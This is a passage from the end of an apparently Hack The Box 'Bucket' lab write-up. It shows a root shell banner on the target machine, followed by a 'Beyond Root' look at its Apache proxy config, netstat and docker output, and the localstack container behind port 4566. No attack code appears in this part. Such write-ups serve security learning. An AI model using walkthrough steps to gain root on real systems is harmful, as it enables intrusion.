+<span class="go">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 04 Feb 2021 03:01:44 PM UTC
+
+  System load:                      0.27
+  Usage of /:                       40.0% of 19.56GB
+  Memory usage:                     19%
+  Swap usage:                       0%
+  Processes:                        183
+  Users logged in:                  1
+  IPv4 address for br-bee97070fb20: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.10.10.212
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:82a7
+
+
+91 updates can be installed immediately.
+0 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Oct 13 10:25:01 2020
+</span><span class="gp">root@bucket:~#</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<p>I was curious as to why I was able to connect to the DB on localhost:4566 using the <code class="language-plaintext highlighter-rouge">aws</code> client from my host. 4566 wasn’t exposed publicly on Bucket, but rather I used the <code class="language-plaintext highlighter-rouge">--endpoint-url http://s3.bucket.htb</code>.</p>
+<p>The apache config (with comments removed) looks like this:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;VirtualHost</span> <span class="err">127.0.0.1:8000</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;IfModule</span> <span class="err">mpm_itk_module</span><span class="nt">&gt;</span>
+                AssignUserId root root
+        <span class="nt">&lt;/IfModule&gt;</span>
+        DocumentRoot /var/www/bucket-app
+<span class="nt">&lt;/VirtualHost&gt;</span>
+<span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+        DocumentRoot /var/www/html
+        RewriteEngine On
+        RewriteCond %{HTTP_HOST} !^bucket.htb$
+        RewriteRule /.* http://bucket.htb/ [R]
+<span class="nt">&lt;/VirtualHost&gt;</span>
+<span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+        ProxyPreserveHost on
+        ProxyPass / http://localhost:4566/
+        ProxyPassReverse / http://localhost:4566/
+        <span class="nt">&lt;Proxy</span> <span class="err">*</span><span class="nt">&gt;</span>
+                 Order deny,allow
+                 Allow from all
+         <span class="nt">&lt;/Proxy&gt;</span>
+        ServerAdmin webmaster@localhost
+        ServerName s3.bucket.htb
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+<span class="nt">&lt;/VirtualHost&gt;</span>
+</code></pre></div></div>
+<p>The first virtual host is routing for the localhost server on port 8000.</p>
+<p>The second one is looking at all traffic that doesn’t have a host ending in <code class="language-plaintext highlighter-rouge">bucket.htb</code> and returning 302 to <code class="language-plaintext highlighter-rouge">http://bucket.htb/</code>. It’s also serving the default <code class="language-plaintext highlighter-rouge">/var/www/html</code>.</p>
+<p>The third server is for <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code>, and it will proxy everything to <code class="language-plaintext highlighter-rouge">http://localhost:4566</code>.</p>
+<p>What is running on 4566? <code class="language-plaintext highlighter-rouge">netstat</code> gives the process as <code class="language-plaintext highlighter-rouge">docker-proxy</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@bucket:/#</span><span class="w"> </span>netstat <span class="nt">-tnlp</span>
+<span class="go">Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:38255         0.0.0.0:*               LISTEN      923/containerd      
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      644/systemd-resolve 
+tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      1382/docker-proxy   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      997/sshd: /usr/sbin 
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1029/apache2        
+tcp6       0      0 :::80                   :::*                    LISTEN      1029/apache2        
+tcp6       0      0 :::22                   :::*                    LISTEN      997/sshd: /us
+</span></code></pre></div></div>
+<p>Looking at the running containers, it’s a container called <code class="language-plaintext highlighter-rouge">localstack</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@bucket:/#</span><span class="w"> </span>docker ps
+<span class="go">CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS                                               NAMES
+444af250749d        localstack/localstack:latest   "docker-entrypoint.sh"   6 months ago        Up 50 minutes       4567-4597/tcp, 127.0.0.1:4566-&gt;4566/tcp, 8080/tcp   localsta
+</span></code></pre></div></div>
+<p><a href="https://github.com/localstack/localstack">localstack</a> is a local AWS cloud stack, designed for developers to develop and test cloud / serverless applications offline. It has a routes which listens on 4566, and manages all the requests to the correct service. This is a really neat way to bring the AWS testing experience to HTB!</p>
+<div class="PageNavigation"><a class="next" href="/2021/05/03/more-bucket-beyond-root.html">More Beyond Root »</a></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/04/24/htb-bucket.html"></a>
+</article>
